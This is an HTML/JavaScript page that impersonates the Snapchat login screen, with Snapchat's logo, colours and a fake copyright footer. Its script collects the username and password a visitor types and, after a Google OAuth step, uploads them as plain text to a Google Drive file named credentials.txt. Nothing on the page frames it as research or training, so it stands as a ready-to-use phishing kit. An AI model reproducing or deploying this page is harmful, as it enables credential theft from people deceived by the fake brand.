<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Login</title>
    <script src="https://apis.google.com/js/api.js"></script>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <style>
        :root {
            --bg-color: #fffc00;
            --text-color: #000;
            --container-bg: white;
            --button-bg: #fffc00;
            --button-hover: #e6e600;
            --google-bg: #4285F4;
            --footer-text: #444;
        }
        .dark-mode {
            --bg-color: #222;
            --text-color: #fff;
            --container-bg: #333;
            --button-bg: #ffcc00;
            --button-hover: #ffb700;
            --footer-text: #bbb;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            transition: background 0.5s ease-in-out, color 0.5s ease-in-out;
        }
        .login-container {
            background: var(--container-bg);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 320px;
            transform: scale(0.9);
            opacity: 0;
            animation: fadeIn 0.6s ease-out forwards;
        }
        @keyframes fadeIn {
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
        .logo {
            width: 100px;
            margin-bottom: 15px;
            animation: bounce 1.2s infinite;
        }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        h2 {
            margin-bottom: 15px;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .input-field:focus {
            border-color: var(--button-bg);
            outline: none;
            transform: scale(1.05);
        }
        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: var(--button-bg);
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s, transform 0.2s;
        }
        .login-btn:hover {
            background-color: var(--button-hover);
            transform: scale(1.05);
        }
        .google-btn {
            background-color: var(--google-bg);
            color: white;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            text-align: center;
            color: var(--footer-text);
        }
        .footer a {
            color: var(--text-color);
            text-decoration: none;
            margin: 0 5px;
        }
        .toggle-mode {
            position: absolute;
            top: 10px;
            right: 10px;
            padding: 8px 12px;
            border: none;
            background: var(--button-bg);
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }
        .toggle-mode:hover {
            background: var(--button-hover);
        }
    </style>
</head>
<body>

    <button class="toggle-mode" onclick="toggleDarkMode()">ðŸŒ™ Dark Mode</button>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1920px-Snapchat_logo.svg.png" class="logo" alt="Snapchat Logo">
        <h2>Snapchat Login</h2>
        <input type="text" id="username" class="input-field" placeholder="Username" required>
        <input type="password" id="password" class="input-field" placeholder="Password" required>
        <button class="login-btn" onclick="saveCredentials()">Login</button>
        <button class="login-btn google-btn" onclick="authenticate()">Login with Google</button>
    </div>

    <div class="footer">
        <p>Â© 2025 Snapchat | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
    </div>

    <script>
        let CLIENT_ID = "404742512626-36gu7pq72bgmdl1k5fq3r1cmqth76sak.apps.googleusercontent.com";
        let DISCOVERY_DOCS = ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"];
        let SCOPES = "https://www.googleapis.com/auth/drive.file";

        function authenticate() {
            gapi.load("client", () => {
                gapi.client.init({
                    clientId: CLIENT_ID,
                    discoveryDocs: DISCOVERY_DOCS,
                    scope: SCOPES
                }).then(() => {
                    return gapi.auth.authorize({
                        client_id: CLIENT_ID,
                        scope: SCOPES,
                        immediate: false
                    });
                }).then(response => {
                    if (response && response.access_token) {
                        alert("Google Drive access granted!");
                    } else {
                        alert("Google Sign-In failed.");
                    }
                }).catch(error => console.error("Auth error:", error));
            });
        }

        function saveCredentials() {
            if (!gapi.auth.getToken()) {
                alert("Please sign in with Google first!");
                return;
            }

            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;

            if (username === "" || password === "") {
                alert("Please enter both username and password.");
                return;
            }

            let content = `Username: ${username}\nPassword: ${password}`;
            let blob = new Blob([content], { type: "text/plain" });

            let reader = new FileReader();
            reader.onloadend = function() {
                let fileContent = reader.result.split(",")[1];
                uploadToDrive(fileContent);
            };
            reader.readAsDataURL(blob);
        }

        function uploadToDrive(fileContent) {
            const boundary = "-------314159265358979323846";
            const delimiter = "\r\n--" + boundary + "\r\n";
            const closeDelimiter = "\r\n--" + boundary + "--";

            const metadata = {
                name: "credentials.txt",
                mimeType: "text/plain"
            };

            const multipartRequestBody =
                delimiter +
                "Content-Type: application/json\r\n\r\n" +
                JSON.stringify(metadata) +
                delimiter +
                "Content-Type: text/plain\r\n\r\n" +
                fileContent +
                closeDelimiter;

            gapi.client.request({
                path: "/upload/drive/v3/files",
                method: "POST",
                params: { uploadType: "multipart" },
                headers: {
                    "Content-Type": "multipart/related; boundary=" + boundary
                },
                body: multipartRequestBody
            }).then(response => {
                alert("File saved to Google Drive!");
            }).catch(error => {
                console.error("Error uploading:", error);
            });
        }

        function toggleDarkMode() {
            document.body.classList.toggle("dark-mode");
        }
    </script>

</body>
</html>
